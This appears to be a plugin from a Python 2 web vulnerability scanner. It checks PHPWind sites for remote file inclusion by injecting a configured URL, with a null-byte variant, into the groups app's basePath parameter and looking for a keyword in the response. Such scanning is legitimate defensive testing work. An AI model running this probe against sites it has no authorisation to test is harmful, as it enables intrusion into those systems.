#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    result = []
    if ob['rfi_url']=='':
        return result
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        geturl="%s%s" % (url,"apps/groups/index.php?route=groups&basePath")

        gettrueurl="%s=%s"%(geturl,ob['rfi_url'])
        response,content=requestUrl(http,gettrueurl,ob['task_id'],ob['domain_id'])
        response1,content1=requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find(ob['rfi_keyword'].encode('utf8'))>=0 and content1.find(ob['rfi_keyword'].encode('utf8'))<0:
            request=getRequest(gettrueurl,'GET')
            response=getResponse(response,"")
            result.append(getRecord(ob,url,ob['level'],detail,request,response))
        else:
            gettrueurl="%s=%s%%00"%(geturl,ob['rfi_url'])
            response,content=requestUrl(http,gettrueurl,ob['task_id'],ob['domain_id'])
            response1,content1=requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if content.find(ob['rfi_keyword'].encode('utf8'))>=0 and content1.find(ob['rfi_keyword'].encode('utf8'))<0:
                request=getRequest(gettrueurl,'GET')
                response=getResponse(response,"")
                result.append(getRecord(ob,url,ob['level'],detail,request,response))
                       
    except Exception,e:
        logging.getLogger().error("File:phpwindremoteinculude.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpwindremoteinculude.py, run_url function :" + str(e))
    #end try
    return result                    
                